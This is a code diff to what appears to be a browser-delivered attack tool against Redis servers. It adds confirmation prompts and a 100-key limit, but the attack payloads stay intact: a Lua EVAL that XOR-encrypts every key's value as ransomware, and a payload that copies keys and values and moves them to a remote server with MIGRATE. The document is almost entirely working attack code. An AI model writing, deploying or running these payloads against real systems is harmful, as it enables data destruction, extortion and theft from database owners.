@@ -31,13 +31,22 @@ var getKey = function(length){
 
 
 var encryptData = function(targets, key){
+    var safety = prompt("Your browser is about to encrypt every redis instance running on " + targets + ", type 'RANSOMEWARE' to continue");
+    if(safety != "RANSOMEWARE"){
+        return false;
+    }
+    alert("Save the encryption key in case you need it!");
     var payload = "EVAL 'redis.pcall(\"SET\", \"WIMREncryptionKey\", \"" + key + "\"); for k, v in pairs(redis.call(\"KEYS\", \"*\")) do if v ~= \"WIMREncryptionKey\" then redis.pcall(\"BITOP\", \"XOR\", v, v, \"WIMREncryptionKey\") end end' 0\n\n\n";
     slamTargets(targets, payload);
 }
 
 
 var exfilData = function(targets){
-    var payload = 'EVAL \'local token = "' + token + '"; for k, v in pairs(redis.call("KEYS", "*")) do if v ~= "WIMREncryptionKey" then redis.call("SET", token, v .. ":" .. redis.call("GET", v)); redis.pcall("MIGRATE", "' + remoteServer + '", "' + tcpPort + '", token,0,200); end; end; redis.call("DEL", token)\' 0\n\n\n';
+    var safety = prompt("Your browser is about to send redis data running on " + targets + " to a remote server, type 'I AM LIABLE' to continue");
+    if(safety != "I AM LIABLE"){
+        return false;
+    }
+    var payload = 'EVAL \'local token = "' + token + '"; local count = 0; for k, v in pairs(redis.call("KEYS", "*")) do count = count + 1; if v ~= "WIMREncryptionKey" and count < 100 then redis.call("SET", token, v .. ":" .. redis.call("GET", v)); redis.pcall("MIGRATE", "' + remoteServer + '", "' + tcpPort + '", token,0,200); end; end; redis.call("DEL", token)\' 0\n\n\n';
     slamTargets(targets, payload);
 }
 
